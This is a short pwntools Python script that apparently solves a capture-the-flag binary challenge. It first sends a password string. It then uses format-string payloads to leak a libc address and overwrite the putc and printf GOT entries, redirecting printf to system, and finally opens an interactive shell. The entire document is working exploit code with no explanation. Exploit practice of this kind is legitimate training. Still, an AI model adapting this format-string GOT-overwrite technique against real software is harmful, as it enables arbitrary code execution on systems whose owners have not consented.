#!/usr/bin/python3

from pwn import *
exe = ELF('./chal')
p = process([exe.path])
# p = gdb.debug([exe.path],'''
#             b * 0x00000000004014dc
#             b* 0x000000000040152d
#             c
              
              
#               ''')

p.sendlineafter(">>> ",b'Lost_in_Light')

payload = f'%{0x1448}c%10$hn%29$p'.encode()
payload = payload.ljust(0x20)
payload += p64(exe.got['putc'])



p.sendlineafter(">>> ",payload)

p.recvuntil(b"0x")
leak_libc = int(p.recv(12),16)
libc_base = leak_libc - 0x29d90
system_addr = libc_base + 0x50d70
log.info("leak_libc: "+hex(leak_libc))
log.info("libc: "+hex(libc_base))

part1 =( system_addr >> 16) & 0xff
part2 = system_addr & 0xffff

payload = f'%{part1}c%10$hhn%{part2 - part1}c%11$hn'.encode()
payload = payload.ljust(0x20)
payload += p64(exe.got['printf']+2)
payload += p64(exe.got['printf'])



p.sendlineafter(">>> ",payload)


p.interactive()